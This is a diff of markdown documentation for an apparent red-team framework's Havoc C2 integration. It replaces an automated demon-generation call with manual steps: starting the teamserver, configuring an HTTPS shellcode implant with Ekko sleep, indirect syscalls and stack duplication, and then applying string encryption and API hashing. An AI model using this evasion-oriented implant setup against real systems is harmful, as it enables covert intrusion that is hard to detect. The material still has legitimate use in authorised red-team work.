@@ -199,7 +199,19 @@ sliver-client import operator1.cfg
 
 ---
 
-## Havoc C2
+## Havoc C2 ⚠️ Manual Generation Required
+
+> **⚠️ IMPORTANT: Havoc Service API Not Yet Available**
+> 
+> The Havoc Service API is currently in development and not yet released.  
+> See: https://havocframework.com/docs/service_api (Status: Coming Soon)
+> 
+> **Current Status:**
+> - ❌ Automated demon generation: Not available
+> - ✅ Manual demon generation: Via GUI client
+> - ✅ Noctis obfuscation: Can be applied to manually generated demons
+> 
+> This integration will be updated to full automation once Havoc releases their Service API.
 
 ### Installation
 
@@ -260,26 +272,36 @@ EOF
 ./client
 ```
 
-### Generate Demon with Noctis
+### Manual Demon Generation (Current Method)
 
-**Python API:**
+> **⚠️ Service API Not Available - Manual Generation Required**
+
+**Step 1: Generate Demon via GUI**
+```bash
+# Start teamserver
+cd Havoc/teamserver
+sudo ./teamserver server --profile profiles/havoc.yaotl -v
+
+# In another terminal, start GUI client
+cd Havoc/Client/Build
+./Havoc
+```
+
+**Step 2: Configure Demon in GUI:**
+- Listener: HTTPS on 192.168.1.100:443
+- Architecture: x64
+- Format: Shellcode (for obfuscation)
+- Sleep Technique: Ekko
+- Enable indirect syscalls
+- Enable stack duplication
+
+**Step 3: Export & Apply Noctis Obfuscation:**
 ```python
-from c2_adapters import generate_havoc_demon
+# After exporting demon.bin from GUI
+from server.obfuscation.string_encryption import StringEncryptor
+from server.obfuscation.api_hashing import APIHasher
 
-result = generate_havoc_demon(
-    listener_host="192.168.1.100",
-    listener_port=443,
-    protocol="https",
-    architecture="x64",
-    sleep_technique="Ekko",  # or "Foliage", "WaitForSingleObjectEx"
-    techniques=["NOCTIS-T124"],
-    obfuscate=True,
-    indirect_syscalls=True,
-    stack_duplication=True
-)
-
-print(f"Demon: {result.beacon_path}")
-print(f"OPSEC Score: {result.opsec_score}/10")
+# This will be automated when Havoc API is released
 ```
 
 **REST API:**
